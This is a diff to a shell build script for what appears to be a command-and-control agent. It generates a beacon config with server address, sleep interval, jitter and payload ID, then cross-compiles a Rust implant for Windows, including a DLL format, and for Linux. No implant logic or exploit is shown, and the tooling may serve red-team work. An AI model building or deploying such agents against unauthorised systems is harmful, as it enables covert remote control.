@@ -78,8 +78,8 @@ else
     SERVER_IP=$LISTENER_HOST
 fi
 
-# Ensure the port is explicitly set
-SERVER_PORT=${LISTENER_PORT:-8080}
+# Use provided port or default to listener config port
+SERVER_PORT=${LISTENER_PORT:-8443}
 
 # Store original output dir (as provided by the server)
 ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"
@@ -129,22 +129,28 @@ if ! command -v cross &> /dev/null; then
     cargo install cross
 fi
 
-echo "Building agent..."
-
-# Create output directory if it doesn't exist
-mkdir -p "$OUTPUT_DIR"
-
 # Create config file with explicit server URL and port and payload ID
-cat > "$OUTPUT_DIR/config.json" << EOF
+cat > "config.json" << EOF
 {
     "server_url": "${SERVER_IP}:${SERVER_PORT}",
     "sleep_interval": ${SLEEP_INTERVAL:-60},
     "jitter": ${JITTER:-2},
-    "payload_id": "${PAYLOAD_ID}"
+    "payload_id": "${PAYLOAD_ID}",
+    "protocol": "http"
 }
 EOF
 
-echo "Created configuration in $OUTPUT_DIR/config.json"
+echo "Created configuration for build-time embedding"
+
+# Also create the config in output directory for backwards compatibility
+mkdir -p "$OUTPUT_DIR"
+cp "config.json" "$OUTPUT_DIR/config.json"
+
+# Create .config directory structure
+mkdir -p "$OUTPUT_DIR/.config"
+cp "config.json" "$OUTPUT_DIR/.config/config.json"
+
+echo "Building agent..."
 
 # Determine build command based on target
 if [ "$BUILD_TYPE" == "debug" ]; then
@@ -186,8 +192,10 @@ if [[ "$TARGET" == *windows* ]]; then
         echo "Using cross for Windows build..."
         if [ "$FORMAT" == "windows_dll" ]; then
             echo "Building with DLL features: cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
+            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
             cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
         else
+            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
             cross build $BUILD_FLAGS --target $TARGET
         fi
     else
@@ -196,13 +204,16 @@ if [[ "$TARGET" == *windows* ]]; then
         rustup target add $TARGET
         if [ "$FORMAT" == "windows_dll" ]; then
             echo "Building with DLL features: cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
+            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
             cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
         else
+            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
             cargo build $BUILD_FLAGS --target $TARGET
         fi
     fi
 else
     # Linux build
+    LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
     cargo build $BUILD_FLAGS --target $TARGET
 fi
 
